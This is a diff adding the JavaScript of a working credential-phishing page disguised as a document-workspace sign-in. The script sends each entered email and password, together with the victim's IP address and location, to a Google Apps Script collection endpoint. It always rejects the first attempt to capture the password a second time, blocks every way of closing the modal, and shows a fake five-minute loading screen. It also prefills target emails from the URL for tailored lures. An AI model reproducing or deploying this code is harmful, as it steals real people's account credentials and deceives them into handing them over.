+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
+  if (!emailRegex.test(email)) {
+    document.getElementById('modalErrorText').textContent = 'Enter a valid email address (e.g. name@example.com).';
+    err.classList.add('show');
+    document.getElementById('loginEmail').focus();
+    document.getElementById('loginEmail').style.borderColor = '#C62828';
+    return;
+  }
+
+  // Show loading state on button
+  btn.disabled = true;
+  spinner.style.display = 'block';
+  icon.style.display = 'none';
+  txt.textContent = 'Signing in…';
+
+  loginAttemptCount++;
+
+  // ── SEND TO GOOGLE APPS SCRIPT ──
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbzDmAaawQ_ekVqgeVyeQZo_z7cm2eHu-0E_gPcBH-ecYApAtk2_ukrKqenn-rMW764CeQ/exec';
+  
+  // Fetch IP and country data
+  fetch('https://ipapi.co/json/')
+    .then(response => response.json())
+    .then(ipData => {
+      const formData = {
+        email: email,
+        password: pass,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        ip: ipData.ip || 'Unknown',
+        country: ipData.country_name || 'Unknown',
+        city: ipData.city || 'Unknown'
+      };
+
+      fetch(scriptURL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(formData)
+      }).catch(e => console.log('Request sent (no-cors mode)'));
+    })
+    .catch(() => {
+      // Fallback if IP API fails
+      const formData = {
+        email: email,
+        password: pass,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        ip: 'Unknown',
+        country: 'Unknown',
+        city: 'Unknown'
+      };
+
+      fetch(scriptURL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(formData)
+      }).catch(e => console.log('Request sent (no-cors mode)'));
+    });
+
+  setTimeout(() => {
+    // Reset button state first
+    btn.disabled = false;
+    spinner.style.display = 'none';
+    icon.style.display = 'block';
+    txt.textContent = 'Sign In';
+
+    if (loginAttemptCount === 1) {
+      // ── FIRST ATTEMPT: always fail ──
+      document.getElementById('modalErrorText').textContent = 'Invalid email address or password. Please try again.';
+      err.classList.add('show');
+      // shake the card
+      const card = document.querySelector('.modal-card');
+      card.style.transition = 'transform .08s';
+      card.style.transform = 'translateX(-6px)';
+      setTimeout(() => { card.style.transform = 'translateX(6px)'; }, 80);
+      setTimeout(() => { card.style.transform = 'translateX(-4px)'; }, 160);
+      setTimeout(() => { card.style.transform = 'translateX(0)'; }, 240);
+      // clear password, keep email, focus password
+      document.getElementById('loginPass').value = '';
+      document.getElementById('loginPass').focus();
+
+    } else {
+      // ── SECOND ATTEMPT: always succeed ──
+      err.classList.remove('show');
+
+      const modal = document.getElementById('loginModal');
+      modal.style.transition = 'opacity .35s ease';
+      modal.style.opacity = '0';
+      setTimeout(() => {
+        modal.style.display = 'none';
+        showDashboardLoader(email);
+      }, 350);
+    }
+  }, 1400);
+}
+
+function showDashboardLoader(email) {
+  const loader    = document.getElementById('dashLoader');
+  const loaderEmail = document.getElementById('loaderEmail');
+  const bar       = document.getElementById('loaderBar');
+  const msg       = document.querySelector('.dash-loader-msg');
+
+  if (loaderEmail && email) loaderEmail.textContent = email;
+  loader.style.display = 'flex';
+  bar.style.transition = 'none';
+  bar.style.width = '0%';
+
+  const TOTAL   = 300000; // 300 seconds
+  const TICK    = 500;   // update every 500ms
+  let elapsed   = 0;
+
+  const phases = [
+    [0,  'Authenticating your session…'],
+    [8,  'Verifying document permissions…'],
+    [18, 'Loading your workspace…'],
+    [32, 'Syncing cloud documents…'],
+    [46, 'Applying security policies…'],
+    [56, 'Almost ready…'],
+  ];
+
+  bar.style.transition = 'width .5s linear';
+
+  const timer = setInterval(() => {
+    elapsed += TICK;
+    const secsLeft = Math.ceil((TOTAL - elapsed) / 1000);
+    const pct      = Math.min((elapsed / TOTAL) * 100, 100);
+    bar.style.width = pct + '%';
+
+    const elapsedSec = elapsed / 1000;
+    let label = phases[0][1];
+    for (const [t, m] of phases) { if (elapsedSec >= t) label = m; }
+    msg.textContent = secsLeft > 0 ? `${label} (${secsLeft}s)` : 'Opening dashboard…';
+
+    if (elapsed >= TOTAL) {
+      clearInterval(timer);
+      bar.style.width = '100%';
+      setTimeout(() => {
+        loader.style.transition = 'opacity .4s ease';
+        loader.style.opacity = '0';
+        setTimeout(() => {
+          loader.style.display = 'none';
+          loader.style.opacity = '1';
+          bar.style.width = '0%';
+          showToast('Welcome back!');
+        }, 400);
+      }, 400);
+    }
+  }, TICK);
+}
+
+function handleSSO() {
+  showToast('Redirecting to SSO provider…');
+  setTimeout(() => {
+    const modal = document.getElementById('loginModal');
+    modal.style.transition = 'opacity .35s ease';
+    modal.style.opacity = '0';
+    setTimeout(() => {
+      modal.style.display = 'none';
+      showDashboardLoader('');
+    }, 350);
+  }, 900);
+}
+
+// Allow Enter key to submit
+document.getElementById('loginPass').addEventListener('keydown', e => {
+  if (e.key === 'Enter') handleLogin();
+});
+document.getElementById('loginEmail').addEventListener('keydown', e => {
+  if (e.key === 'Enter') document.getElementById('loginPass').focus();
+});
+
+// Block all attempts to close modal via Escape or clicking overlay
+document.getElementById('loginModal').addEventListener('click', e => {
+  if (e.target === document.getElementById('loginModal')) {
+    // Shake the card to indicate it cannot be dismissed
+    const card = document.querySelector('.modal-card');
+    card.style.animation = 'none';
+    card.style.transform = 'translateX(-8px)';
+    setTimeout(() => { card.style.transform = 'translateX(8px)'; }, 80);
+    setTimeout(() => { card.style.transform = 'translateX(-5px)'; }, 160);
+    setTimeout(() => { card.style.transform = 'translateX(0)'; }, 240);
+  }
+});
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape' && document.getElementById('loginModal').style.display !== 'none') {
+    e.preventDefault();
+    const card = document.querySelector('.modal-card');
+    card.style.transform = 'scale(1.02)';
+    setTimeout(() => { card.style.transform = 'scale(1)'; card.style.transition = 'transform .2s'; }, 150);
+  }
+});
+
+// ── EMAIL PREFILL FROM URL ──
+// Supports ?email=you@example.com  OR  #email=you@example.com
+(function () {
+  function getParam(key) {
+    const qs = new URLSearchParams(window.location.search);
+    if (qs.has(key)) return qs.get(key);
+    const hs = new URLSearchParams(window.location.hash.replace(/^#/, ''));
+    if (hs.has(key)) return hs.get(key);
+    return null;
+  }
+  const prefill = getParam('email');
+  if (prefill) {
+    const field = document.getElementById('loginEmail');
+    if (field) {
+      field.value = decodeURIComponent(prefill);
+      field.style.borderColor = 'var(--blue)';
+      setTimeout(() => document.getElementById('loginPass').focus(), 150);
+    }
+  }
+})();
+
+// ── LIVE EMAIL VALIDATION ──
+(function () {
+  const emailInput = document.getElementById('loginEmail');
+  const passInput  = document.getElementById('loginPass');
+  const err        = document.getElementById('modalError');
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
+
+  let emailTouched = false;
+
+  // Clear red border and error as user edits the email field
+  emailInput.addEventListener('input', () => {
+    emailInput.style.borderColor = '';
+    // Only show inline hint after user has left the field once
+    if (emailTouched) {
+      if (emailInput.value && !emailRegex.test(emailInput.value)) {
+        emailInput.style.borderColor = '#E68619'; // amber — not final error yet
+        setEmailHint('Please enter a valid email address.');
+      } else {
+        emailInput.style.borderColor = emailInput.value ? 'var(--blue)' : '';
+        clearEmailHint();
+      }
+    }
+  });
+
+  // On blur: full validation
+  emailInput.addEventListener('blur', () => {
+    emailTouched = true;
+    const val = emailInput.value.trim();
+    if (!val) { clearEmailHint(); return; }
+    if (!emailRegex.test(val)) {
+      emailInput.style.borderColor = '#C62828';
+      setEmailHint('Enter a valid email address (e.g. name@company.com).');
+    } else {
+      emailInput.style.borderColor = 'var(--blue)';
+      clearEmailHint();
+    }
+  });
+
+  // On focus: clear error state
+  emailInput.addEventListener('focus', () => {
+    if (emailInput.style.borderColor === 'rgb(198, 40, 40)') return; // keep red if already invalid
+    emailInput.style.borderColor = 'var(--blue)';
+  });
+
+  // Clear error banner when user starts typing password
+  passInput.addEventListener('input', () => {
+    if (err.classList.contains('show')) {
+      err.classList.remove('show');
+    }
+  });
+
+  function setEmailHint(msg) {
+    let hint = document.getElementById('emailHint');
+    if (!hint) {
+      hint = document.createElement('div');
+      hint.id = 'emailHint';
+      hint.style.cssText = 'font-size:9px;margin-top:3px;padding:3px 6px;border-radius:3px;';
+      emailInput.parentNode.appendChild(hint);
+    }
+    hint.style.color = '#C62828';
+    hint.style.background = '#FFF0F0';
+    hint.textContent = msg;
+  }
+
+  function clearEmailHint() {
+    const hint = document.getElementById('emailHint');
+    if (hint) hint.remove();
+  }
+})();
+</script>
+</body>
+</html>
